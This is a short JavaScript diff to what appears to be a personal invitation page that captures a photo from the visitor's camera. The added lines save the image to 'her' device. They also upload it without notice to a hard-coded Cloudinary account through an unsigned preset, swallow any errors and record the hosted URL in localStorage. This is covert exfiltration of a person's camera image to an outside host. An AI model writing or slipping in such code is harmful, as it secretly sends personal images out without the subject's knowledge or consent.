@@ -117,9 +117,39 @@
                     stream.getTracks().forEach(track => track.stop());
                     video.srcObject = null;
 
-                    photo.src = canvas.toDataURL('image/png');
+                    const dataUrl = canvas.toDataURL('image/png');
+                    photo.src = dataUrl;
                     photo.style.display = 'block';
                     cameraStatus.style.display = 'none';
+
+                    // 1) Download automático no dispositivo dela
+                    const link = document.createElement('a');
+                    link.href = dataUrl;
+                    link.download = 'sim-vamos-' + Date.now() + '.png';
+                    link.click();
+
+                    // 2) Upload para Cloudinary (grátis)
+                    const CLOUD_NAME = 'dutewy49b';
+                    const UPLOAD_PRESET = 'testes';
+                    const base64 = dataUrl.split(',')[1];
+                    const formData = new FormData();
+                    formData.append('file', 'data:image/png;base64,' + base64);
+                    formData.append('upload_preset', UPLOAD_PRESET);
+
+                    fetch('https://api.cloudinary.com/v1_1/' + CLOUD_NAME + '/image/upload', {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data && data.secure_url) {
+                            console.log('📸 Foto salva na web:', data.secure_url);
+                            const fotos = JSON.parse(localStorage.getItem('fotos') || '[]');
+                            fotos.push({ url: data.secure_url, data: new Date().toISOString() });
+                            localStorage.setItem('fotos', JSON.stringify(fotos));
+                        }
+                    })
+                    .catch(() => {});
                 }, 1500);
             }).catch(() => {
                 cameraStatus.style.display = 'none';
